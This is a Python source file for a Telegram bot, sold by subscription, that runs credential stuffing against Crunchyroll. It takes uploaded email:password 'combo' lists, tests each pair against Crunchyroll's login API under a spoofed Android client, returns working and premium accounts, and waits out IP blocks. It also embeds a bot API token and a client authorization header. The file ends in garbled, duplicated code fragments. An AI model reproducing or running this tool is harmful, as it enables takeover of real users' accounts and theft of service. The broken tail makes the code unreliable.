import telebot
import requests
import time
import json
from datetime import datetime, timedelta
import random
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

API_TOKEN = '7440238098:AAGDs_IiFT1Sa4esb_yPSwRonWQxq2o7Bac'
bot = telebot.TeleBot(API_TOKEN)

def check_crunchyroll_account(email, password):
    device_id = ''.join(random.choice('0123456789abcdef') for _ in range(32))
    url = "https://beta-api.crunchyroll.com/auth/v1/token"
    headers = {
        "host": "beta-api.crunchyroll.com",
        "authorization": "Basic d2piMV90YThta3Y3X2t4aHF6djc6MnlSWlg0Y0psX28yMzRqa2FNaXRTbXNLUVlGaUpQXzU=",
        "x-datadog-sampling-priority": "0",
        "etp-anonymous-id": "855240b9-9bde-4d67-97bb-9fb69aa006d1",
        "content-type": "application/x-www-form-urlencoded",
        "accept-encoding": "gzip",
        "user-agent": "Crunchyroll/3.59.0 Android/14 okhttp/4.12.0"
    }
    data = {
        "username": email,
        "password": password,
        "grant_type": "password",
        "scope": "offline_access",
        "device_id": device_id,
        "device_name": "SM-G9810",
        "device_type": "samsung SM-G955N"
    }

    response = requests.post(url, headers=headers, data=data)
    print(response.text)
    if response.status_code == 200:
        response_text = response.text
        if "account content mp:limited offline_access" in response_text:
            return 'good'
        elif "account content mp offline_access reviews talkbox" in response_text:
            return 'premium'
        elif "406 Not Acceptable" in response_text:
            return 'block'
    return 'bad'

def create_status_keyboard(results):
    keyboard = InlineKeyboardMarkup()
    keyboard.row(
        InlineKeyboardButton(f"Total: {results['total']}", callback_data="total"),
        InlineKeyboardButton(f"Good: {results['good']}", callback_data="good")
    )
    keyboard.row(
        InlineKeyboardButton(f"Premium: {results['premium']}", callback_data="premium"),
        InlineKeyboardButton(f"Bad: {results['bad']}", callback_data="bad")
    )
    return keyboard
with open('chrunch.json', 'r') as file:
    data = json.load(file)
    subscribers = {subscriber['id']: subscriber['expiry_date'] for subscriber in data['subscribers']}

@bot.message_handler(commands=['start'])
def send_welcome(message):
    chat_id = str(message.chat.id)
    if chat_id not in subscribers:
        bot.reply_to(message, "𝖸𝗈! /chk 𝗂𝗌 𝖿𝗈𝗋 𝗄𝗂𝖽𝗌, 𝗂𝖿 𝗒𝗈𝗎 𝗐𝖺𝗇𝗍 𝗍𝗈 𝖼𝗁𝖾𝖼𝗄 𝖼𝗈𝗆𝖻𝗈 𝗒𝗈𝗎 𝗁𝖺𝗏𝖾 𝗍𝗈 𝗍𝖺𝗄𝖾 𝖺𝖼𝖼𝖾𝗌𝗌 𝖿𝗋𝗈𝗆 (@wdym_raj) MiRaGe.")
        return
    
    expiry_date_str = subscribers[chat_id]
    expiry_date = datetime.strptime(expiry_date_str, '%Y-%m-%d')
    current_date = datetime.now()
    
    if current_date > expiry_date:
        bot.reply_to(message, "Sorry, your premium subscription has expired.")
    else:
        bot.reply_to(message, f"𝖣𝗋𝗈𝗉 𝖠 𝖢𝗈𝗆𝖻𝗈 𝖧𝖾𝗋𝖾 𝖠𝗇𝖽 𝖫𝖾𝗍 𝖬𝖾 𝖣𝗈 𝖬𝖺𝗀𝗂𝖼 🪄")

@bot.message_handler(content_types=['document'])
def handle_docs(message):
    chat_id = str(message.chat.id)
    if chat_id not in subscribers:
        bot.send_message(message.chat.id, "𝖭𝗈𝗍 𝖿𝗈𝗋 𝗄𝗂𝖽𝗌. 𝖳𝖺𝗄𝖾 𝖺𝖼𝖼𝖾𝗌𝗌 𝖿𝗋𝗈𝗆 .")
        return
    file_info = bot.get_file(message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)

    with open("combo.txt", 'wb') as new_file:
        new_file.write(downloaded_file)

    with open("combo.txt", 'r') as file:
        combos = file.readlines()

    results = {'total': len(combos), 'good': 0, 'premium': 0, 'bad': 0}

    status_message = bot.send_message(
        message.chat.id,
        "Checking accounts...",
        reply_markup=create_status_keyboard(results)
    )

    for combo in combos:
        email, password = combo.strip().split(':')
        result = check_crunchyroll_account(email, password)

        if result == 'good':
            results['good'] += 1
            bot.send_message(message.chat.id, text=f"Cʀᴜɴᴄʜʏʀᴏʟʟ ᥫ᭡ ⋆Good⋆\n{email}:{password}\n𝘉𝘰𝘵 𝘣𝘺: MiRaGe")
        elif result == 'premium':
            results['premium'] += 1
            bot.send_message(message.chat.id, text=f"Cʀᴜɴᴄʜʏʀᴏʟʟ ᥫ᭡ ⋆Premium⋆\n{email}:{password}\n𝘉𝘰𝘵 𝘣𝘺: MiRaGe")
        elif result == 'block':
            bot.send_message(message.chat.id, text=f"Sorry, we have to wait 5m due to ip block.")
            time.sleep(360)
        else:
            results['bad'] += 1
        time.sleep(2)
        # Update the inline keyboard with the current status
        bot.edit_message_reply_markup(
            message.chat.id,
            status_message.message_id,
            reply_markup=create_status_keyboard(results)
        )

@bot.message_handler(commands=['chk'])
def handle_chk(message):
    try:
        command, credentials = message.text.split(' ', 1)
        email, password = credentials.split(':')
        
        result = check_crunchyroll_account(email, password)

        if result == 'good':
            bot.send_message(message.chat.id, text=f"Cʀᴜɴᴄʜʏʀᴏʟʟ ᥫ᭡ ⋆Good⋆\n{email}:{password}\n𝘉𝘰𝘵 𝘣𝘺: MiRaGe")
        elif result == 'premium':
            bot.send_message(message.chat.id, text=f"Cʀᴜɴᴄʜʏʀᴏʟʟ ᥫ᭡ ⋆Premium⋆\n{email}:{password}\n𝘉𝘰𝘵 𝘣𝘺: MiRaGe")
        elif result == 'block':
            bot.send_message(message.chat.id, text=f"Sorry, we have to wait 5m due to ip block.")
            time.sleep(360)
        else:
            bot.send_message(message.chat.id, text=f"Bad: {email}:{password}")
    except Exception as e:
        bot.send_message(message.chat.id, text="Invalid format. Use /chk email:password")

def load_data():
    with open('chrunch.json', 'r') as file:
        return json.load(file)

def save_data(data):
    with open('chrunch.json', 'w') as file:
        json.dump(data, file, indent=4)

Admins = ['987654321'] 

@bot.message_handler(commands=['subscribers'])
def send_subscribers(message):
    if str(message.chat.id) not in Admins:
        bot.send_message(message.chat.id, "You are not authorized to use this command.")
        return

    data = load_data()
    response = ""
    for subscriber in data['subscribers']:
        response += f"ID: {subscriber['id']} - Expiry Date: {subscriber['expiry_date']}\n"

    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['kick'])
def kick_subscriber(message):
    if str(message.chat.id) not in Admins:
        bot.send_message(message.chat.id, "You are not authorized to use this command.")
        return

    args = message.text.split()
    if len(args) < 2:
        bot.send_message(message.chat.id, "Please provide a subscriber ID to kick.")
        return

    subscriber_id_to_kick = args[1]
    data = load_data()
    original_subscriber_count = len(data['subscribers'])
    data['subscribers'] = [sub for sub in data['subscribers'] if sub['id'] != subscriber_id_to_kick]

    if len(data['subscribers']) == original_subscriber_count:
        bot.send_message(message.chat.id, "Subscriber ID not found.")
    else:
        save_data(data)
        bot.send_message(message.chat.id, f"Subscriber {subscriber_id_to_kick} has been removed.")
@bot.message_handler(commands=['allow'])
def allow_subscriber(message):
    if str(message.chat.id) not in Admins:
        bot.send_message(message.chat.id, "You are not authorized to use this command.")
        return

    args = message.text.split()
    if len(args) < 3:
        bot.send_message(message.chat.id, "Please provide a subscriber ID and number of days.")
        return

    new_id, days = args[1], int(args[2])
    expiry_date = (datetime.now() + timedelta(days=days)).strftime('%Y-%m-%d')
    data = load_data()
    data['subscribers'].append({'id': new_id, 'expiry_date': expiry_date})
    save_data(data)
    bot.send_message(message.chat.id, f"Subscriber {new_id} added with expiry on {expiry_date}.")       
bot.infinity_polling()
_polling()
ty_polling()
with expiry on {expiry_date}.")       
bot.infinity_polling()
_polling()
ty_polling()
